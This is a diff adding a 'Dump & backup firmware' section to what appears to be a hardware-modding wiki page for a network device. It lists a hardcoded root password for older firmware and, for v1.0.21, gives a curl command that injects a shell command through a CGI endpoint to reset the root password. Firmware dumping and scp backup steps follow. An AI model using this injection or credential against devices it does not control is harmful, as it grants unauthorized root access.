@@ -127,6 +127,71 @@ to the host interface, such as `192.168.11.2/24`[^4].
     iptables -t nat -A POSTROUTING -o eth9 -d 192.168.11.0/24 -j SNAT --to 192.168.11.2
     ```
 
+## Dump & backup firmware <small>optional</small> { #dump-and-backup-firmware data-toc-label="Dump & backup firmware" }
+
+### Shell credentials
+
+=== "&lt;= v1.0.20"
+
+    | Username | Password       |
+    | -------- | -------------- |
+    | root     | QpZm@4246#5753 |
+
+=== "v1.0.21"
+
+    The <ins>root</ins> password is undisclosed at this time, use the suggested exploit below to gain root privileges.
+
+??? bug "Exploit to temporarily change the root password"
+    Run the following command to temporarily change the root password to `root`.
+
+    === ":fontawesome-brands-windows: Windows"
+
+        ``` sh
+        curl -s -o null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
+        ```
+
+    === ":material-apple: macOS"
+
+        !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"
+
+        ``` sh
+        brew install curl
+        curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
+        ```
+
+    === ":material-linux: Linux"
+
+        !!! note "The following commands assume [Debian] or derivatives[^3]"
+
+        ``` sh
+        sudo apt-get install curl
+        curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
+        ```
+
+### Dump volumes
+
+``` sh
+ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 
+```
+
+``` sh
+mkdir -p /tmp/fw ; for part in kernelA bootcoreA rootfsA kernelB bootcoreB rootfsB; do VOL=$(ubinfo /dev/ubi0 -N "$part" | grep "Volume ID" | awk '{print $3}'); [ -n "$VOL" ] && { DEV="/dev/ubi0_$VOL"; OUT="/tmp/fw/ubi0_$VOL-$part.img"; echo "Dumping $part ($DEV) to: $OUT"; dd if="$DEV" of="$OUT"; }; done
+```
+
+### Backup to host
+
+=== ":fontawesome-brands-windows: Windows"
+
+    ``` sh
+    scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1:/tmp/fw/ubi* .
+    ```
+
+=== ":material-apple: macOS / :material-linux: Linux"
+
+    ``` sh
+    scp -O -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1:/tmp/fw/ubi* .
+    ```
+
 ## Web UI upgrade <small>not recommended</small> { #web-ui-upgrade data-toc-label="Web UI upgrade" }
 
 ### Web credentials
